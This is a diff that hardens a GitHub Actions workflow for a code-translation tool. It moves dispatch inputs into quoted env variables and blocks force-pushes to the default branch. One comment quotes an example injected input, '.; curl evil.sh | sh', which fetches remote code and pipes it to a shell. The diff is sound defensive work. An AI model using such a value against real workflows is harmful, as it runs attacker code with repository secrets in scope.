@@ -16,7 +16,7 @@ on:
         required: false
         default: "."
       output_branch:
-        description: "Branch to push translated code to"
+        description: "Branch to push translated code to (must not be the default branch)"
         required: false
         default: "translated"
 
@@ -35,18 +35,49 @@ jobs:
         with:
           python-version: "3.12"
 
-      - name: Install repo-translator
+      # Every step below reads the dispatch inputs through `env:` and quotes the
+      # variable, never `${{ }}` interpolated straight into the script. Inline
+      # interpolation splices the input into the shell source before bash sees
+      # it, so an input like `.; curl evil.sh | sh` runs as its own command --
+      # with contents: write and ANTHROPIC_API_KEY in scope.
+
+      - name: Refuse to overwrite the default branch
+        env:
+          OUTPUT_BRANCH: ${{ inputs.output_branch }}
+          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
         run: |
-          pip install git+https://github.com/${{ github.repository_owner }}/repo-translator.git
+          set -euo pipefail
+          if [ -z "$OUTPUT_BRANCH" ]; then
+            echo "output_branch must not be empty" >&2
+            exit 1
+          fi
+          # The push below is a --force, so aiming it at the default branch would
+          # discard history rather than add to it.
+          if [ "$OUTPUT_BRANCH" = "$DEFAULT_BRANCH" ]; then
+            echo "Refusing to force-push over the default branch ($DEFAULT_BRANCH)." >&2
+            exit 1
+          fi
+
+      # Installed from the checkout above, not re-fetched over the network. The
+      # previous `pip install git+.../repo-translator.git` could never have
+      # worked -- this repository is `langshift`; only the distribution inside
+      # it is named repo-translator -- and it would have translated whatever was
+      # on the default branch rather than the commit this run checked out.
+      - name: Install langshift
+        run: pip install .
 
       - name: Run translation
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          INPUT_DIR: ${{ inputs.input_dir }}
+          FROM_LANG: ${{ inputs.from_lang }}
+          TO_LANG: ${{ inputs.to_lang }}
         run: |
+          set -euo pipefail
           repo-translate \
-            --input "${{ github.event.inputs.input_dir }}" \
-            --from  "${{ github.event.inputs.from_lang }}" \
-            --to    "${{ github.event.inputs.to_lang }}" \
+            --input  "$INPUT_DIR" \
+            --from   "$FROM_LANG" \
+            --to     "$TO_LANG" \
             --output ./translated_output
 
       - name: Upload report as artifact
@@ -58,10 +89,15 @@ jobs:
             translated_output/translation_report.json
 
       - name: Push translated code to branch
+        env:
+          OUTPUT_BRANCH: ${{ inputs.output_branch }}
+          FROM_LANG: ${{ inputs.from_lang }}
+          TO_LANG: ${{ inputs.to_lang }}
         run: |
+          set -euo pipefail
           git config user.name  "repo-translator[bot]"
           git config user.email "repo-translator@users.noreply.github.com"
-          git checkout -B "${{ github.event.inputs.output_branch }}"
+          git checkout -B "$OUTPUT_BRANCH"
           git add translated_output/
-          git commit -m "chore: translate ${{ github.event.inputs.from_lang }} → ${{ github.event.inputs.to_lang }} [auto]" || echo "Nothing to commit"
-          git push origin "${{ github.event.inputs.output_branch }}" --force
+          git commit -m "chore: translate $FROM_LANG → $TO_LANG [auto]" || echo "Nothing to commit"
+          git push origin "$OUTPUT_BRANCH" --force
